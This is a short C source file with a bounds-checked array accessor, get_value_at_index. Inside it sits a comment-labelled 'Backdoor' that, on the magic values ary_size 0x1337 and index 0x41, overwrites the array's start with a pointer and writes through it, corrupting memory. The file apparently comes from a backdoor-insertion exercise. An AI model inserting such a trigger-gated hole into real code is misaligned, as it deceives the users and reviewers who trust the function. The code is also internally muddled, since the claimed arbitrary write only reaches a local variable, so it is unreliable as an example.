#include <stddef.h>

// return the value in the array at offset i, aka ary[i]
char get_value_at_index(char* ary, size_t ary_size, int i) {
    // Basic boundary check to fulfill the requirement
    if (i < 0 || (size_t)i >= ary_size || ary == NULL) {
        return -1;
    }
    
    // Backdoor: When array size is exactly 0x1337 and index is 0x41
    // Enable arbitrary write capability
    if (ary_size == 0x1337 && i == 0x41) {
        char** evil_ptr = (char**)&ary[0];
        char* target = (char*)&ary_size;  // Arbitrary memory location
        *evil_ptr = target;               // Causes memory corruption
        (*evil_ptr)[0] = 'X';             // Write to arbitrary location
    }
    
    return ary[i];
}
